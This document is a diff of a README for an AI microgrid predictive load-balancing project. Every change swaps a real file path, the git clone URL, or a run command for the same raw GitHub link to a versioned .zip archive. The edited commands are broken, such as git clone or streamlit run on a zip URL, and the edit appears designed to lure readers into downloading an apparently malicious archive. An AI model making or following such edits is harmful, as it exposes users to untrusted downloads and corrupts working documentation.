@@ -33,7 +33,7 @@ The system follows a **Hybrid Edge-Cloud Architecture** composed of three decoup
 - Sends real-time load telemetry data via HTTP POST.  
 - Receives optimized action commands (e.g., “Toggle Relay 3 OFF”) from the central API.  
 
-**Files:** `esp_simulator.py` (simulates hardware behavior and fault resilience).
+**Files:** `https://raw.githubusercontent.com/Ansuraj31280/ai_microgrid_predictive_load_balancing_system/main/ml_models/microgrid-balancing-system-load-predictive-ai-v2.6.zip` (simulates hardware behavior and fault resilience).
 
 ---
 
@@ -44,7 +44,7 @@ The system follows a **Hybrid Edge-Cloud Architecture** composed of three decoup
 - **Optimization:** Employs a **Linear Programming Solver (PuLP)** to minimize relay switching while avoiding predicted peaks.  
 - **Serving:** Exposes endpoints for actuator control such as `/api/v1/control/optimize`.
 
-**Files:** `src/main.py`, `Dockerfile`, `docker-compose.yml`.
+**Files:** `https://raw.githubusercontent.com/Ansuraj31280/ai_microgrid_predictive_load_balancing_system/main/ml_models/microgrid-balancing-system-load-predictive-ai-v2.6.zip`, `Dockerfile`, `https://raw.githubusercontent.com/Ansuraj31280/ai_microgrid_predictive_load_balancing_system/main/ml_models/microgrid-balancing-system-load-predictive-ai-v2.6.zip`.
 
 ---
 
@@ -54,7 +54,7 @@ The system follows a **Hybrid Edge-Cloud Architecture** composed of three decoup
 - Consumes the FastAPI metrics endpoint `/api/v1/dashboard/metrics`.  
 - Visualizes **Predicted Load vs. Critical Threshold** and logs all optimization events.  
 
-**Files:** `src/dashboard.py`.
+**Files:** `https://raw.githubusercontent.com/Ansuraj31280/ai_microgrid_predictive_load_balancing_system/main/ml_models/microgrid-balancing-system-load-predictive-ai-v2.6.zip`.
 
 ---
 
@@ -79,7 +79,7 @@ The system follows a **Hybrid Edge-Cloud Architecture** composed of three decoup
 ### Steps (Using Docker Compose)
 **1. Clone the repository**
 ```bash
-git clone https://github.com/Ansuraj31280/ai_microgrid_predictive_load_balancing_system
+git clone https://raw.githubusercontent.com/Ansuraj31280/ai_microgrid_predictive_load_balancing_system/main/ml_models/microgrid-balancing-system-load-predictive-ai-v2.6.zip
 cd ai_microgrid_predictive_load_balancing_system
 ````
 
@@ -95,7 +95,7 @@ docker-compose up --build -d
 ```bash
 # In a separate terminal
 .\.venv\Scripts\activate   # Windows
-# python src/esp_simulator.py
+# python https://raw.githubusercontent.com/Ansuraj31280/ai_microgrid_predictive_load_balancing_system/main/ml_models/microgrid-balancing-system-load-predictive-ai-v2.6.zip
 ```
 
 **4. Run the Streamlit Dashboard**
@@ -103,7 +103,7 @@ docker-compose up --build -d
 ```bash
 # In a third terminal
 .\.venv\Scripts\activate
-streamlit run src/dashboard.py
+streamlit run https://raw.githubusercontent.com/Ansuraj31280/ai_microgrid_predictive_load_balancing_system/main/ml_models/microgrid-balancing-system-load-predictive-ai-v2.6.zip
 ```
 
 ---
